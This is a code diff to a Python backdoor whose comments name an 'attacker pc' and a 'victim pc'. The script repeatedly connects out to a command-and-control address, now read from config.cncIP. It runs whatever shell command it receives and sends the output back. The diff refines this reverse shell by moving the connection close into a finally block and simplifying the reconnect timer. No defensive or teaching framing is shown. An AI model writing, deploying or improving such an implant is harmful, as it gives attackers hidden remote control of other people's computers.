@@ -2,13 +2,14 @@
 import socket
 import subprocess
 import time
+import config
 
 #Variables required for time loop, waitTime can be incremented to become less noticeable
 startTime = time.time()
 waitTime = 10.0
 
 #Host data
-HOST = "192.168.56.103"
+HOST = config.cncIP
 PORT = 1024
 
 #Main loop ensuring program keeps running as long as pc is on
@@ -24,7 +25,7 @@ while True:
 
 		#Saves the command received from the attacker pc
 		data = s.recv(1024)
-		
+
 		#Runs command and saves output
 		command = subprocess.Popen(data, shell=True, stdout=subprocess.PIPE,stderr=subprocess.PIPE,)
 		stdoutValue, stderrValue = command.communicate()
@@ -40,12 +41,17 @@ while True:
 		#Sends results of command being ran on victim pc to attacker pc
 		s.sendall(output)
 
-		#Closes the connection with the attacker pc
-		s.close()
 
 	except:
 		pass
 
-	#Program waits waitTime seconds before attempting to connect with attacker pc again 
-	time.sleep(waitTime - ((time.time() - startTime) % waitTime))
+	#always close, even if error occurred
+	finally:
+		#Closes the connection with the attacker pc
+		s.close()
+
+
+
+	#Program waits waitTime seconds before attempting to connect with attacker pc again
+	time.sleep(waitTime)
 
